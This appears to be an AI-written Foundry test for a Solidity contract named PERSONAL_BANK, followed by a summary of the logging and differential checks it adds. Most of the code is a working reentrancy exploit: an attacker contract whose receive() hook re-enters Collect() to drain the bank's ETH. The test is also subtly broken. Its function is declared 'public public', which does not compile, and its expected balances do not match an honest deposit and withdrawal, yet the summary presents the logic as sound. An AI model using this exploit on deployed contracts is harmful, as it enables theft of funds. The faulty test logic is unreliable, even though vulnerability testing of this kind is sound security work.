```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import "../src/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol";

contract ReentrancyTest is Test {
    PERSONAL_BANK public bank;
    LogFile public logFile;
    MaliciousAttacker public attacker;

    uint public constant DEPOSIT_AMOUNT = 2 ether;
    uint public constant WITHDRAW_AMOUNT = 1 ether;

    function setUp() public {
        // Deploy contracts
        logFile = new LogFile();
        bank = new PERSONAL_BANK();

        // Configure PERSONAL_BANK
        bank.SetLogFile(address(logFile));
        bank.SetMinSum(0);
    }

    function testReentrancyInCollect() public public {
        // Deploy attacker contract
        attacker = new MaliciousAttacker(address(bank));

        // Fund attacker
        vm.deal(address(attacker), DEPOSIT_AMOUNT);

        console2.log("--- BEFORE-Trigger Attack ---");
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 attackerBankBalanceBefore = bank.balances(address(attacker));
        console2.log("Bank ETH before:", bankBalanceBefore);
        console2.log("Attacker ETH before:", attackerBalanceBefore);
        console2.log("Bank's record of attacker balance before:", attackerBankBalanceBefore);

        console2.log("--- Trigger Attack ---");
        attacker.attack(WITHDRAW_AMOUNT);

        console2.log("--- AFTER-Trigger Attack ---");
        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 attackerBankBalanceAfter = bank.balances(address(attacker));
        console2.log("Bank ETH after:", bankBalanceAfter);
        console2.log("Attacker ETH after:", attackerBalanceAfter);
        console2.log("Bank's record of attacker balance after:", attackerBankBalanceAfter);

        // State should be fully cleared if no vulnerability
        uint256 expectedBankBalance = bankBalanceBefore;
        uint256 expectedAttackerBalance = attackerBalanceBefore;
        uint256 expectedAttackerBankBalance = attackerBankBalanceBefore + DEPOSIT_AMOUNT - 2 * WITHDRAW_AMOUNT;

        // Differential logic checks
        bool bankBalanceConsistent = (bankBalanceAfter == expectedBankBalance);
        bool attackerBalanceConsistent = (attackerBalanceAfter == expectedAttackerBalance);
        bool bankRecordConsistent = (attackerBankBalanceAfter == expectedAttackerBankBalance);

        console2.log("Bank balance consistency:", bankBalanceConsistent);
        console2.log("Attacker balance consistency:", attackerBalanceConsistent);
        console2.log("Bank record consistency:", bankRecordConsistent);

        // Final vulnerability verdict
        if (!bankRecordConsistent) {
            console2.log("Vulnerability Exists: Bank's internal record shows %s WEI (expected %s WEI) while bank ETH is drained", attackerBankBalanceAfter, expectedAttackerBankBalance);
        } else {
            console2.log("Vulnerability not Exist: All balances consistent after attack");
        }
    }
}

contract MaliciousAttacker {
    PERSONAL_BANK public immutable bank;
    uint public withdrawAmount;

    constructor(address _bank) {
        bank = PERSONAL_BANK(payable(_bank));
    }

    function attack(uint _amount) public {
        withdrawAmount = _amount;
        bank.Deposit{value: address(this).balance}();
        bank.Collect(_amount);
    }

    // Called during ETH transfer to re-enter
    receive() external payable {
        if (address(bank).balance >= withdrawAmount) {
            bank.Collect(withdrawAmount);
        }
    }
}
```

Key additions:
1. Added `console2` for detailed state logging
2. Differential checks capture:
   - Bank ETH balance before/after
   - Attacker ETH balance before/after
   - Bank's recorded attacker balance before/after
3. Computed expected values based on deposit and withdrawals
4. Vulnerability verdict based on consistency of bank's internal records:
   - If bank's recorded attacker balance ≠ expected value → vulnerability exists
   - Final verdict printed as either:
     `Vulnerability Exists: Bank's internal record shows...` OR 
     `Vulnerability not Exist: All balances consistent...`

The differential validation detects reentrancy by catching inconsistency between the bank's internal accounting and actual ETH balances after the attack.

